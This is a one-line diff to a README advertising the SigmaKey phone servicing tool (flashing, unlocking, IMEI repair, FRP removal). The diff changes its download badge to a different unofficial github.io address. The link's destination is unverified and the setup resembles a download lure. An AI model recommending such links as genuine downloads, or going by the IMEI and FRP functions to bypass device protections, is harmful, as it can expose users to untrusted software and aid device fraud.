@@ -2,7 +2,7 @@
 
 SigmaKey is a powerful and professional phone servicing solution for Qualcomm, HiSilicon, MediaTek, and Broadcom-based smartphones. It allows flashing, unlocking, repairing IMEI, removing FRP, and servicing Huawei, Motorola, ZTE, Alcatel, and other popular brands. This all-in-one tool is widely used in mobile repair shops and by firmware engineers.
 
-[![Download SigmaKey](https://img.shields.io/badge/Download-SigmaKey-blueviolet)](https://sigmakey-download.github.io/.github)
+[![Download SigmaKey](https://img.shields.io/badge/Download-SigmaKey-blueviolet)](https://sigmakey-download-tool.github.io/.github/)
 
 ---
 
